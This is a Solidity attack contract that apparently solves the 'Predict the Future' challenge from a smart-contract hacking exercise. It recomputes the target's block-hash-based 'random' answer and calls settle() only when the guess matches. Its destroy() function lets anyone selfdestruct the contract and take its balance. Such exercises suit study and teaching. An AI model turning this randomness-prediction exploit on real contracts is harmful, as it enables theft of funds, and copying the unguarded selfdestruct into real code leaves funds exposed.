pragma solidity ^0.4.26;

import "./PredictTheFutureChallengeInterface.sol";

contract ProxyContract {
  constructor() public payable {}

  // Fallback payable function necessary otherwise win function would revert.
  // Fallback functions are executed when a contract receives plain Ether without
  // any other data associated with the transaction. In this case, when `settle` function
  // is called and answer is correct, 2 ethers will be transfered to ProxyContract (and no data is sent).
  //
  function() public payable {}

  event LastBlockAnswer(uint8 lastBlockAnswer);

  // setting variable with 100 since value can actually be set as 0
  uint8 guess = 100;

  function lockInGuess(uint8 _guess, address _addr) public payable {
    PredictTheFutureChallengeInterface target = PredictTheFutureChallengeInterface(_addr);

    require(guess == 100, "There's a guess value currently locked.");

    target.lockInGuess.value(msg.value)(_guess);

    guess = _guess;
  }

  function tryWin(address _addr) public {
    require(guess != 100, "No guess value locked yet.");

    PredictTheFutureChallengeInterface target = PredictTheFutureChallengeInterface(_addr);

    uint8 thisBlockAnswer = uint8(keccak256(abi.encodePacked(blockhash(block.number - 1), now))) % 10;

    emit LastBlockAnswer(thisBlockAnswer);

    require(thisBlockAnswer == guess, "Better wait for the next block, current guess does not match block answer.");

    target.settle();
  }

  // needless to say but still, call function with
  // `send` and respective account instead of `call`
  function destroy() public {
    selfdestruct(msg.sender);
  }
}
